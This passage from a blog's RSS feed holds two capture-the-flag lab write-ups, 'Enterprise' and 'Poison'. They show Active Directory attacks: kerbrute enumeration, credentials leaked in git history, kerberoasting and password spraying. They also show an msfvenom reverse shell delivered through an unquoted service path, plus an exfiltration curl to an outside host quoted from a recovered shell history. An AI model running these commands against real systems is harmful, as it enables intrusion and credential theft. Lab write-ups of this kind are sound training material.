getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat Consolehost_hisory.txt                                                                  
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo &#34;replication:101RepAdmin123!!&#34;&gt;private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H &#39;Cotent-Type: ascii/text&#39; -d .\private.txt&#39; http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
</code></pre><p>We see the credentials <code>replication</code>:<code>101RepAdmin123!!</code>. I tried using the credentials. Unfortunately, it appears that the <code>replication</code> user has been deleted.</p>
<p>We can also brute force usernames by taking advantage of the KDC&rsquo;s prompt for preauthentication for valid usernames (it returns an error if given a nonexistent username). I used <a href="https://github.com/ropnop/kerbrute">kerbrute</a>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ ~/opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc 10.10.62.141 --domain lab.enterprise.thm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/18/24 - Ronnie Flathers @ropnop

2024/09/18 17:47:42 &gt;  Using KDC(s):
2024/09/18 17:47:42 &gt;   10.10.62.141:88

2024/09/18 17:47:47 &gt;  [+] VALID USERNAME:       banana@lab.enterprise.thm
2024/09/18 17:47:54 &gt;  [+] VALID USERNAME:       guest@lab.enterprise.thm
2024/09/18 17:48:20 &gt;  [+] VALID USERNAME:       administrator@lab.enterprise.thm
2024/09/18 17:49:53 &gt;  [+] VALID USERNAME:       cake@lab.enterprise.thm
2024/09/18 17:50:51 &gt;  [+] VALID USERNAME:       enterprise@lab.enterprise.thm
2024/09/18 17:51:40 &gt;  [+] VALID USERNAME:       nik@lab.enterprise.thm
2024/09/18 17:52:34 &gt;  [+] VALID USERNAME:       Guest@lab.enterprise.thm
2024/09/18 17:52:35 &gt;  [+] VALID USERNAME:       Administrator@lab.enterprise.thm
2024/09/18 17:57:00 &gt;  [+] VALID USERNAME:       Banana@lab.enterprise.thm
2024/09/18 17:57:14 &gt;  [+] VALID USERNAME:       spooks@lab.enterprise.thm
2024/09/18 17:59:28 &gt;  [+] VALID USERNAME:       joiner@lab.enterprise.thm
</code></pre><p>I then tried sprayed <code>101RepAdmin123!!</code> against the usernames and variations of it (e.g. <code>101RepAdmin123!</code>) against the users to no avail. ASREProasting also turned up nothing, so I had to look at other attack vectors.</p>
<p>There are also two HTTP services running on ports 80 and 7990 that we can take a look at. While port 80 did not yield anything interesting, there is an Atlassian portal on port 7990. The login portal itself appears to be a static and unexploitable webpage, but there is a message mentioning that the org may be moving to Github.</p>
<p><img src="/img/enterprise/atlassian.png" alt="Atlassian login portal"></p>
<p>I have to admit, it took me way longer than I would have liked to figure out that there was an actual Github page associated with &ldquo;Enterprise-THM&rdquo; as opposed to something like a .git folder hidden in a subdirectory.</p>
<p><img src="/img/enterprise/enterprise_github.png" alt="Enterprise-THM Github page"></p>
<p>The Github page has a single repository that doesn&rsquo;t hold any useful information. However, there is an associated account &ldquo;Nik-enterprise-dev&rdquo; which has a repository &ldquo;mgmtScript.ps1&rdquo;. This could prove to be out lucky break.</p>
<p><img src="/img/enterprise/nik_github.png" alt="Nik-enterprise-dev Github page"></p>
<h3 id="foothold">Foothold</h3>
<p>The PowerShell script takes in a username and password and gets the system information of all computers within an active directory network. While the <code>$userName</code> and <code>$userPassword</code> fields are empty, we can see that there has been more than one change pushed to this repository.</p>
<p><img src="/img/enterprise/git_history.png" alt="mgmtScript.ps1 Repository history"></p>
<p>We can look at the details by cloning the repository.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone https://github.com/Nik-enterprise-dev/mgmtScript.ps1.git
</span></span></code></pre></div><p>I then switched to the repository folder and ran <code>git log</code>. This shows, among others, the commit hash for each push to the repository. We can use these hashes to view changes and previous versions of the repo.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git log                                                           
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

commit bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 18:57:40 2021 -0500

    Create SystemInfo.ps1
    
    Gets System Info from each computer on the domain
</code></pre><p>In one of his commits, Nik comments that he &ldquo;accidentally added something&rdquo;. We can view the details by supplying the commit hash.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/mgmtScript.ps1]
└─$ git show c3c239df75fefbe7563d1d29c963ba1f01e4fe5a
commit c3c239df75fefbe7563d1d29c963ba1f01e4fe5a (HEAD -&gt; main, origin/main, origin/HEAD)
Author: Nik-enterprise-dev &lt;80557956+Nik-enterprise-dev@users.noreply.github.com&gt;
Date:   Sat Mar 13 20:09:16 2021 -0500

    Updated things
    
    I accidentally added something

diff --git a/SystemInfo.ps1 b/SystemInfo.ps1
index bc7ca27..5ae7576 100644
--- a/SystemInfo.ps1
+++ b/SystemInfo.ps1
@@ -1,6 +1,6 @@
 Import-Module ActiveDirectory
-$userName = &#39;nik&#39;
-$userPassword = &#39;&lt;nik&#39;s password&gt;&#39;
+$userName = &#39;&#39;
+$userPassword = &#39;&#39;
 $psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
 $Computers = New-Object -TypeName &#34;System.Collections.ArrayList&#34;
 $Computer = $(Get-ADComputer -Filter * | Select-Object Name)
</code></pre><p>We see that Nik had accidentally pushed his credentials and the final commit removed them from the repository. I tried <code>nik</code>:<code>&lt;nik's password&gt;</code> against a number of services, but the account does not have sufficient privileges to gain a foothold through common services like RDP or SMB. However, since it is a domain account, we can also perform other attacks such as kerberoasting.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:&#39;&lt;nik&#39;s password&gt;&#39; -dc-ip 10.10.62.141 -request -outputfile kerberoast.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 15:16:41.570158             



[-] CCache file is not found. Skipping...
</code></pre><p>We get a hash for <code>bitbucket</code>. Now to crack it&hellip;</p>
<pre tabindex="0"><code>hashcat -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Eventually, it cracks.</p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>With the new credentials for the <code>bitbucket</code> service account, I connected to the domain controller through RDP.</p>
<pre tabindex="0"><code>xfreerdp /v:10.10.62.141 /u:bitbucket /p:&lt;bitbucket&#39;s password&gt; /cert-ignore
</code></pre><p>After some enumeration, I found an unquoted service path.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;wmic service get name,pathname | findstr /i /v &#34;C:\Windows\\&#34; | findstr /i /v &#34;&#34;&#34;
Name                                      PathName                                                                      
AtlassianBitbucket                        C:\Atlassian\Bitbucket\7.11.1\bin\bserv64.exe //RS//AtlassianBitbucket        
AtlassianBitbucketElasticsearch           C:\Atlassian\Bitbucket\7.11.1\elasticsearch\bin\elasticsearch-service-x64.exe //RS//AtlassianBitbucketElasticsearch
LSM                                                                                                                     
NetSetupSvc                                                                                                             
zerotieroneservice                        C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe               
</code></pre><p>Unquoted service paths are a vulnerability that arises due to the way Windows runs its binaries. Say we have a program <code>C:\Users\Public\My Programs\New Program.exe</code>, Windows will first try to execute <code>C:\Users\Public\My.exe</code> followed by <code>C:\Users\Public\My Program.exe</code>, <code>C:\Users\Public\My Program\New.exe</code>, and finally <code>C:\Users\Public\My Programs\New Program.exe</code> because of the spaces in and the path and lack of enclosing quotes. <code>zerotieroneservice</code> is vulnerable to this type of exploit.</p>
<p>Importantly, the service binary is owned by <code>NT AUTHORITY\SYSTEM</code>.</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;dir /q &#34;C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe&#34;
 Volume in drive C has no label.
 Volume Serial Number is 7CD9-A0AE

 Directory of C:\Program Files (x86)\Zero Tier\Zero Tier One

12/05/2014  11:52 AM         9,594,056 NT AUTHORITY\SYSTEM    ZeroTier One.exe
               1 File(s)      9,594,056 bytes
               0 Dir(s)  40,566,411,264 bytes free
</code></pre><p>User permissions for <code>C:\Program Files (x86)\Zero Tier</code>:</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;icacls &#34;C:\Program Files (x86)\Zero Tier&#34;
C:\Program Files (x86)\Zero Tier BUILTIN\Users:(OI)(CI)(W)
                                 NT SERVICE\TrustedInstaller:(I)(F)
                                 NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                 NT AUTHORITY\SYSTEM:(I)(F)
                                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Administrators:(I)(F)
                                 BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                 BUILTIN\Users:(I)(RX)
                                 BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                 CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
</code></pre><p><code>bitbucket</code>, as a member of <code>BUILTIN\Users</code>, has write access to the <code>C:\Program Files (x86)\Zero Tier</code> directory through <code>BUILTIN\Users</code>. It is therefore possible to write a &ldquo;Zero.exe&rdquo; binary have the zerotieroneservice execute it.</p>
<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.48.55 LPORT=31337 -f exe -o Zero.exe
</code></pre><p>Now to transfer it to our target&hellip;</p>
<pre tabindex="0"><code>python3 -m http.server 80
</code></pre><pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;certutil -urlcache -f http://10.13.48.55/Zero.exe Zero.exe
</code></pre><p>Next, I checked the status of <code>zerotieroneservice</code>.</p>
<pre tabindex="0"><code>C:\Program Files (x86)\Zero Tier&gt;sc query zerotieroneservice

SERVICE_NAME: zerotieroneservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
</code></pre><p>The service is not running. All that needs to be done now is to start the service and we should receive a shell as <code>NT AUTHORITY\SYSTEM</code> (Don&rsquo;t forget to start a listener first).</p>
<pre tabindex="0"><code>C:\Users\bitbucket&gt;sc start zerotieroneservice
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 31337
listening on [any] 31337 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.146.30] 49930
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Poison</title>
      <link>http://localhost:1313/posts/poison/</link>
      <pubDate>Mon, 16 Sep 2024 20:59:17 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/poison/</guid>
      <description><![CDATA[<p><img src="/img/poison/poison.png#center" alt="Poison"></p>
<h3 id="description">Description</h3>
<p>Poison is a Medium difficulty FreeBSD box. Exploitation involves gaining a low-privilege shell through a vulnerable webapp and escalating privileges through improperly secured credentials.</p>
<h3 id="recon">Recon</h3>
<p>We start by running a Nmap scan against the target.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -A 10.10.10.84 -T5   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 01:19 GMT
Warning: 10.10.10.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.84
Host is up (0.041s latency).
Not shown: 45954 filtered tcp ports (no-response), 19579 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%), FreeBSD 11.1-STABLE (97%), FreeBSD 11.2-RELEASE - 11.3 RELEASE or 11.2-STABLE (96%), FreeBSD 11.3-RELEASE (96%), FreeBSD 11.0-STABLE (95%), FreeBSD 11.1-RELEASE or 11.2-STABLE (95%), FreeBSD 11.1-RELEASE (95%), FreeBSD 11.0-CURRENT (94%), FreeBSD 11.0-RELEASE (94%), FreeBSD 12.0-RELEASE - 13.0-CURRENT (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   40.51 ms 10.10.14.1
2   40.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.47 seconds
</code></pre><p>The scan shows that TCP ports 22 and 80 are open. Visiting the webpage on port 80, we can see a website with the title &ldquo;Temporary website to test local .php scripts&rdquo;.</p>
<p><img src="/img/poison/website.png" alt="website"></p>
<p>There is a list of files that we can test. I tried listfiles.php. The output was messy, so I used view source to get a cleaner view.</p>
<p><img src="/img/poison/listfiles.png" alt="listfiles.php result"></p>
<p>We get a directory listing. It appears as if browse.php is executing php files that are passed to it. http wrappers are disabled unfortunately, so we can&rsquo;t get a shell through RFI :(. We could also try other attack vectors like log poisoning (which does give you shell as <code>www-data</code>), but there is an interesting file &ldquo;pwdbackup.txt&rdquo; that we can check out first.</p>
<p><img src="/img/poison/encodedpass.png" alt="pwdbackup text"></p>
<p>Success! Now all we need to do is decode the password. We will need to do this 13 times, as implied by the note from out unsuspecting target. This can be done by passing the password to <code>base64 -d</code> manually, but it&rsquo;s far simpler to use a script. I&rsquo;ve provided one below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>encoded_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..13<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        encoded_pass<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;</span>$encoded_pass<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>After running the script, we get our password <code>Charix!2#4%6&amp;8(0</code>.</p>
<h3 id="foothold">Foothold</h3>
<p>We have a password, but we don&rsquo;t know any users we could potentially authenticate as. Recall that the webpage can read files. Since we know that the target machine is likely FreeBSD, a Unix-like OS, we can try to read the <code>/etc/passwd</code> to find users.</p>
<p><img src="/img/poison/traversal_passwd.png" alt="/etc/passwd file"></p>
<p>Notice there are three users: <code>root</code>, <code>toor</code>, and <code>charix</code> that seem interesting. We can spray our password against these accounts via ssh. It is true that <code>Charix!2#4%6&amp;8(0</code> is likely the password for <code>charix</code>, it&rsquo;s still worth checking the other accounts for password reuse.</p>
<p><img src="/img/poison/pass_spray.png" alt="Password spray"></p>
<p>And now we can authenticate as <code>charix</code> to the server.</p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Now that we have a shell, we can move onto privilege escalation. Feel free to grab the user flag, but there is also a <code>secret.zip</code> file that might be interesting. It&rsquo;s password protected though, and I find files easier to investigate when they are on my local machine. So I transferred the zip file to Kali.</p>
<p>On Kali:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 8000 &gt; secret.zip            
listening on [any] 8000 ...
</code></pre><p>On Poison:</p>
<pre tabindex="0"><code>charix@Poison:~ % nc -nv 10.10.14.33 8000 &lt; secret.zip
Connection to 10.10.14.33 8000 port [tcp/*] succeeded!
</code></pre><p>Before trying to crack the password, we can test for password reuse by supplying the password we got for <code>charix</code> . It succeeds and we get a <code>secret</code> file that appears to be random binary data. I couldn&rsquo;t figure out its purpose at this point, so I decided to enumerate further. I noticed three TCP ports only accessible from localhost on Poison: 25, 5801, and 5901.</p>
<pre tabindex="0"><code>charix@Poison:~ % sockstat -4
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      728   4  tcp4   *:80                  *:*
charix   sshd       719   3  tcp4   10.10.10.84:22        10.10.14.33:57270
root     sshd       716   3  tcp4   10.10.10.84:22        10.10.14.33:57270
www      httpd      704   4  tcp4   *:80                  *:*
root     sendmail   642   3  tcp4   127.0.0.1:25          *:*
www      httpd      641   4  tcp4   *:80                  *:*
www      httpd      640   4  tcp4   *:80                  *:*
www      httpd      639   4  tcp4   *:80                  *:*
www      httpd      638   4  tcp4   *:80                  *:*
www      httpd      637   4  tcp4   *:80                  *:*
root     httpd      625   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
</code></pre><p>I had already checked for any mail-related privesc vectors at this point, so I was more interested in ports 5801 and 5901. However, since they were only accessible by localhost on Poison, I had to forward them to my attacker machine.</p>
<pre tabindex="0"><code># Forward Port 5801
ssh -N -L 5801:127.0.0.1:5801 charix@10.10.10.84

# Forward Port 5901
ssh -N -L 5901:127.0.0.1:5901 charix@10.10.10.84
</code></pre><p>Now we can do some more enumeration.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo nmap -p5801,5901 127.0.0.1 -sV --script=default
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-17 19:27 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000097s latency).

PORT     STATE SERVICE VERSION
5801/tcp open  http    Bacula http config
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.83 seconds
</code></pre><p>VNC is running on port 5901. VNC is a system designed to share screens. This means that a user using VNC can interact with&hellip; The VNC password file is usually stored in <code>~/.vnc/passwd</code>. This path does not exist for <code>charix</code> though, but there was a <code>passwd</code> file that we extracted from <code>secret.zip</code>. We can check if it it indeed a VNC password file by attempting to extract its password:</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ cat secret | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
VNCP@$$!
</code></pre><p>Success! Now that we are certain we have a VNC password file, we can use it to connect to Poison.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ vncviewer -passwd secret 127.0.0.1::5901
</code></pre><p><img src="/img/poison/vnc_pwn.png" alt="vnc successful connect"></p>
<p>Congrats, you&rsquo;ve rooted Poison!</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
